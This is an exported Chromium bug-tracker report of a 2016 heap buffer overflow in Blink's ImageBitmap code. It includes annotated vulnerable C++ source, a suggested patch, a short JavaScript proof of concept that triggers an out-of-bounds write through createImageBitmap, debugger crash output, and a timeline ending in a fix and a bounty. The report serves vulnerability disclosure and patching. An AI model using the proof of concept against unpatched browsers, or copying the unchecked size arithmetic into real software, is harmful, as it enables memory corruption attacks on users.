# Security: heap-buffer-overflow in ImageBitmap::ImageBitmap

| Field | Value |
|-------|-------|
| **Issue ID** | [40085137](https://issues.chromium.org/issues/40085137) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Canvas |
| **Reporter** | [Deleted User] |
| **Assignee** | xi...@chromium.org |
| **Created** | 2016-08-17 |
| **Bounty** | $5,500.00 |

## Description

**VULNERABILITY DETAILS**

There is a heap buffer overflow vulnerability in Blink.

## File third\_party/Webkit/Source/core/frame/ImageBitmap.cpp, line 399

## 399 if (!parsedOptions.premultiplyAlpha) { 400 unsigned char\* srcAddr = data->data()->data(); <-- user-controlled 401 int srcHeight = data->size().height(); <-- user-controlled 402 int dstHeight = parsedOptions.cropRect.height(); <-- user-controlled 403 404 // Using kN32 type, swizzle input if necessary. 405 SkImageInfo info = SkImageInfo::Make(parsedOptions.cropRect.width(), dstHeight, kN32\_SkColorType, kUnpremul\_SkAlphaType); 406 int srcPixelBytesPerRow = info.bytesPerPixel() \* data->size().width(); 407 int dstPixelBytesPerRow = info.bytesPerPixel() \* parsedOptions.cropRect.width(); 408 RefPtr<SkImage> skImage; 409 if (parsedOptions.cropRect == IntRect(IntPoint(), data->size())) { ... 414 } else { 415 std::unique\_ptr<uint8\_t[]> copiedDataBuffer = wrapArrayUnique(new uint8\_tdstHeight \* dstPixelBytesPerRow); <--- OOM or Integer Overflow 416 if (!srcRect.isEmpty()) { ... 419 int copyHeight = srcHeight - srcPoint.y(); ... 425 for (int i = 0; i < copyHeight; i++) { 426 int srcStartCopyPosition = (i + srcPoint.y()) \* srcPixelBytesPerRow + srcPoint.x() \* info.bytesPerPixel(); 427 int srcEndCopyPosition = srcStartCopyPosition + copyWidth \* info.bytesPerPixel(); 428 int dstStartCopyPosition; 429 if (parsedOptions.flipY) 430 dstStartCopyPosition = (dstHeight -1 - dstPoint.y() - i) \* dstPixelBytesPerRow + dstPoint.x() \* info.bytesPerPixel(); <-- user-controlled 431 else 432 dstStartCopyPosition = (dstPoint.y() + i) \* dstPixelBytesPerRow + dstPoint.x() \* info.bytesPerPixel(); 433 for (int j = 0; j < srcEndCopyPosition - srcStartCopyPosition; j++) { 434 // swizzle when necessary 435 if (kN32\_SkColorType == kBGRA\_8888\_SkColorType) { 436 if (j % 4 == 0) 437 copiedDataBuffer[dstStartCopyPosition + j] = srcAddr[srcStartCopyPosition + j + 2]; 438 else if (j % 4 == 2) 439 copiedDataBuffer[dstStartCopyPosition + j] = srcAddr[srcStartCopyPosition + j - 2]; 440 else 441 copiedDataBuffer[dstStartCopyPosition + j] = srcAddr[srcStartCopyPosition + j]; <-- out-of-bounds write with user-controlled data 442 } else { 443 copiedDataBuffer[dstStartCopyPosition + j] = srcAddr[srcStartCopyPosition + j]; 444 } 445 } 446 } 447 } 448 skImage = newSkImageFromRaster(info, std::move(copiedDataBuffer), dstPixelBytesPerRow); 449 }

Please take a look at line 415.

To prove this vulnerability, I used the image as a following description.  

`parsedOptions.premultiplyAlpha` is 0.  

`info.bytesPerPixel()` is 4.  

`parsedOptions.cropRect.width()` is 0x8000.  

`dstHeight` is 0x8000  

`dstPixelBytesPerRow` is 0x20000.

On x86(LP32/LP64 build), It will cause an integer overflow.  

And then, the size of `copiedDataBuffer` will be 0.

On x64, Memory allocation failed.  

So the `copiedDataBuffer` will be NULL. And passing a NULL pointer.

This vulnerability is exploitable.  

Because an attacker easily controlled overflow-size, oob-offset, oob-value, allocation-size, etc..

## \* Fix Suggestion File third\_party/Webkit/Source/core/frame/ImageBitmap.cpp

405 SkImageInfo info = SkImageInfo::Make(parsedOptions.cropRect.width(), dstHeight, kN32\_SkColorType, kUnpremul\_SkAlphaType);

- ```
    if (((uint32_t)-1) / (uint32_t)info.bytesPerPixel() < (uint32_t)data->size().width())  
  
  ```
- ```
        return;  
  
  ```

406 int srcPixelBytesPerRow = info.bytesPerPixel() \* data->size().width();

- ```
    if (((uint32_t)-1) / (uint32_t)info.bytesPerPixel() < (uint32_t)parsedOptions.cropRect.width())  
  
  ```
- ```
        return;  
  
  ```

407 int dstPixelBytesPerRow = info.bytesPerPixel() \* parsedOptions.cropRect.width();  

408 RefPtr<SkImage> skImage;  

409 if (parsedOptions.cropRect == IntRect(IntPoint(), data->size())) {  

...  

414 } else {

- ```
        if (((uint32_t)-1) / (uint32_t)dstHeight < (uint32_t)dstPixelBytesPerRow)  
  
  ```
- ```
            return;  
  
  ```

415 std::unique\_ptr<uint8\_t[]> copiedDataBuffer = wrapArrayUnique(new uint8\_tdstHeight \* dstPixelBytesPerRow);

- ```
        if (!copiedDataBuffer)  
  
  ```
- ```
            return;  
  
  ```

---

**VERSION**  

Tested On,  

Stable 52.0.2743.116 + Windows 10  

Beta 53.0.2785.57 + Windows 7  

asan-linux-release-412479 54.0.2832.0 + Ubuntu 16.04

## **REPRODUCTION CASE** \* Minimize PoC

<script>
var canvas = document.createElement("canvas");
var ctx = canvas.getContext("2d");
var imageData = ctx.createImageData(1024, 1024);
for (var i=0; i<1024\\*1024\\*4; i++)
imageData.data[i] = 0x41;
createImageBitmap(imageData, 0, 0, 0x8000, 0x8000, {premultiplyAlpha:"none"});
</script>

---

I attached as `poc.html`

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Attached as `asan_trace.log` and `windbg_trace.log`

(d14.10cc): Access violation - code c0000005 (first chance)  

First chance exceptions are reported before any exception handling.  

This exception may be expected and handled.  

chrome\_child!blink::ImageBitmap::ImageBitmap+0x32f:  

63d2316d 880c06 mov byte ptr [esi+eax],cl ds:002b:06467010=??  

0:000:x86> r  

eax=00000000 ebx=00000003 ecx=00000041 edx=44a07000 esi=06467010 edi=00001000  

eip=63d2316d esp=006fd720 ebp=006fd7b4 iopl=0 nv up ei pl zr na pe nc  

cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b efl=00010246  

chrome\_child!blink::ImageBitmap::ImageBitmap+0x32f:  

63d2316d 880c06 mov byte ptr [esi+eax],cl ds:002b:06467010=??  

0:000:x86> u  

chrome\_child!blink::ImageBitmap::ImageBitmap+0x32f [c:\b\build\slave\win\build\src\third\_party\webkit\source\core\frame\imagebitmap.cpp @ 288]:  

63d2316d 880c06 mov byte ptr [esi+eax],cl  

63d23170 40 inc eax  

63d23171 3bc7 cmp eax,edi  

63d23173 7cdd jl chrome\_child!blink::ImageBitmap::ImageBitmap+0x314 (63d23152)  

63d23175 8b75d0 mov esi,dword ptr [ebp-30h]  

63d23178 8b4dc8 mov ecx,dword ptr [ebp-38h]  

63d2317b 43 inc ebx  

63d2317c 03750c add esi,dword ptr [ebp+0Ch]  

0:000:x86> dd copiedDataBuffer  

006fd798 06407010 bb5fd000 00000000 3fde5fa0  

006fd7a8 63d23bcc 00cf3080 00000018 006fd80c  

006fd7b8 63c0db5b 00000400 00001000 00000400  

006fd7c8 00020000 006fd7de 5ce115e0 3fde5f68  

006fd7d8 006fd8e0 00010000 00a2e548 006fd818  

006fd7e8 00000000 00000000 00008000 00008000  

006fd7f8 00000000 00000000 00008000 00008000  

006fd808 00a2e548 006fd860 643746ac 006fd8e0  

0:000:x86> dd 06407010  

06407010 41414141 41414141 41414141 41414141  

06407020 41414141 41414141 41414141 41414141  

06407030 41414141 41414141 41414141 41414141  

06407040 41414141 41414141 41414141 41414141

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 306 B)
- [asan_trace.log](attachments/asan_trace.log) (text/plain, 13.6 KB)
- [windbg_trace.log](attachments/windbg_trace.log) (text/plain, 15.6 KB)
- [patch.txt](attachments/patch.txt) (text/plain, 6.3 KB)

## Timeline

### ji...@chromium.org (2016-08-17)

Thanks for reporting this issue,gogil@stealien.com!

+xidachen@, could you help triage this one? Please feel free to re-assign if you see fit. 

Thanks!

[Monorail components: Blink>Canvas]

### [Deleted User] (2016-08-18)

There are a number of vulnerabilities in ImageBitmap.
https://chromium.googlesource.com/chromium/src/+/master/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#108
https://chromium.googlesource.com/chromium/src/+/master/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#222
https://chromium.googlesource.com/chromium/src/+/master/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#382
https://chromium.googlesource.com/chromium/src/+/master/third_party/WebKit/Source/core/frame/ImageBitmap.cpp#415

Please take a look at the attached patch.

### xi...@chromium.org (2016-08-18)

gogil@: I really appreciate your report and help. I have a patch that is currently under review. Link to the patch:
https://codereview.chromium.org/2249853008/

### bu...@chromium.org (2016-08-26)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6

commit a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6
Author: xidachen <xidachen@chromium.org>
Date: Fri Aug 26 11:44:02 2016

Reject createImageBitmap promise when the cropRect or resize is too big

At this moment, creating an ImageBitmap has several options such as flipY
and premultiplyAlpha = false. So in some cases, we would have to convert
the premultiplied input to unpremul format, and that involves allocating
new memory. To prevent any potential integer overflow or OOM situation,
this CL checks the size of the cropRect and the resizeWidth(resizeHeight),
if the width * height * bytesPerPixel is larger than size_t range, we reject
the promise. By doing the check at the beginning of each ImageBitmap constructor,
we can guarantee that the subsequent multiplication of
width * height * bytesPerPixel will not overflow.

This CL also correct other places where there could be
potential integer overflow. In particular, since we have checked at
the beginning of each ImageBitmap constructor, it should be safe
to use size_t for any computation of width * height in the code.

TBR=kbr@chromium.org, haraken@chromium.org
BUG=638615
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.win:win_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2249853008
Cr-Commit-Position: refs/heads/master@{#414687}

[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage-video.html
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage.html
[add] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-size-tooBig.html
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/Source/bindings/core/v8/ScriptValueSerializer.cpp
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/Source/core/frame/ImageBitmap.cpp
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/Source/core/frame/ImageBitmap.h
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/Source/core/imagebitmap/ImageBitmapFactories.cpp
[modify] https://crrev.com/a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### xi...@chromium.org (2016-08-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-08-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-08)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-09-09)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-09-09)

Your change meets the bar and is auto-approved for M54 (branch: 2840)

### bu...@chromium.org (2016-09-09)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/91ec52303dfb46bb62583a5ddc9be4c24cb559c2

commit 91ec52303dfb46bb62583a5ddc9be4c24cb559c2
Author: Xida Chen <xidachen@chromium.org>
Date: Fri Sep 09 13:20:17 2016

Reject createImageBitmap promise when the cropRect or resize is too big

At this moment, creating an ImageBitmap has several options such as flipY
and premultiplyAlpha = false. So in some cases, we would have to convert
the premultiplied input to unpremul format, and that involves allocating
new memory. To prevent any potential integer overflow or OOM situation,
this CL checks the size of the cropRect and the resizeWidth(resizeHeight),
if the width * height * bytesPerPixel is larger than size_t range, we reject
the promise. By doing the check at the beginning of each ImageBitmap constructor,
we can guarantee that the subsequent multiplication of
width * height * bytesPerPixel will not overflow.

This CL also correct other places where there could be
potential integer overflow. In particular, since we have checked at
the beginning of each ImageBitmap constructor, it should be safe
to use size_t for any computation of width * height in the code.

TBR=kbr@chromium.org, haraken@chromium.org
BUG=638615
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.win:win_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2249853008
Cr-Commit-Position: refs/heads/master@{#414687}
(cherry picked from commit a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6)

Review URL: https://codereview.chromium.org/2325603005 .

Cr-Commit-Position: refs/branch-heads/2840@{#267}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage-video.html
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage.html
[add] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-size-tooBig.html
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/bindings/core/v8/ScriptValueSerializer.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/frame/ImageBitmap.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/frame/ImageBitmap.h
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/imagebitmap/ImageBitmapFactories.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### aw...@chromium.org (2016-09-16)

[Empty comment from Monorail migration]

### go...@chromium.org (2016-09-21)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### di...@chromium.org (2016-09-23)

[Automated comment] Request affecting a post-stable build (M53), manual review required.

### go...@chromium.org (2016-09-23)

Approving merge to M53 branch 2785 based on merge request by awhalley@ #13, assuming it is is safe to merge. Please merge ASAP. Thank you.

### go...@chromium.org (2016-09-23)

Not approving  merge to M53 based on internal email "Concern over a Merge-Request-53".

### xi...@chromium.org (2016-09-23)

Thank you so much.

### am...@chromium.org (2016-09-23)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-03)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-03)

The panel awarded $5,500 for this bug. Thank you!

### aw...@chromium.org (2016-10-04)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-10)

[Empty comment from Monorail migration]

### aw...@chromium.org (2016-10-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2016-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/91ec52303dfb46bb62583a5ddc9be4c24cb559c2

commit 91ec52303dfb46bb62583a5ddc9be4c24cb559c2
Author: Xida Chen <xidachen@chromium.org>
Date: Fri Sep 09 13:20:17 2016

Reject createImageBitmap promise when the cropRect or resize is too big

At this moment, creating an ImageBitmap has several options such as flipY
and premultiplyAlpha = false. So in some cases, we would have to convert
the premultiplied input to unpremul format, and that involves allocating
new memory. To prevent any potential integer overflow or OOM situation,
this CL checks the size of the cropRect and the resizeWidth(resizeHeight),
if the width * height * bytesPerPixel is larger than size_t range, we reject
the promise. By doing the check at the beginning of each ImageBitmap constructor,
we can guarantee that the subsequent multiplication of
width * height * bytesPerPixel will not overflow.

This CL also correct other places where there could be
potential integer overflow. In particular, since we have checked at
the beginning of each ImageBitmap constructor, it should be safe
to use size_t for any computation of width * height in the code.

TBR=kbr@chromium.org, haraken@chromium.org
BUG=638615
CQ_INCLUDE_TRYBOTS=master.tryserver.chromium.win:win_optional_gpu_tests_rel;master.tryserver.chromium.mac:mac_optional_gpu_tests_rel

Review-Url: https://codereview.chromium.org/2249853008
Cr-Commit-Position: refs/heads/master@{#414687}
(cherry picked from commit a43a9eaba800ac7a88b22e8ea6d1666c8dc28ab6)

Review URL: https://codereview.chromium.org/2325603005 .

Cr-Commit-Position: refs/branch-heads/2840@{#267}
Cr-Branched-From: 1ae106dbab4bddd85132d5b75c670794311f4c57-refs/heads/master@{#414607}

[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage-video.html
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-drawImage.html
[add] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/LayoutTests/fast/canvas/canvas-createImageBitmap-size-tooBig.html
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/bindings/core/v8/ScriptValueSerializer.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/frame/ImageBitmap.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/frame/ImageBitmap.h
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/core/imagebitmap/ImageBitmapFactories.cpp
[modify] https://crrev.com/91ec52303dfb46bb62583a5ddc9be4c24cb559c2/third_party/WebKit/Source/modules/webgl/WebGLRenderingContextBase.cpp


### sh...@chromium.org (2016-12-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@gmail.com (2017-11-23)

[Comment Deleted]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/638615?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085137)*
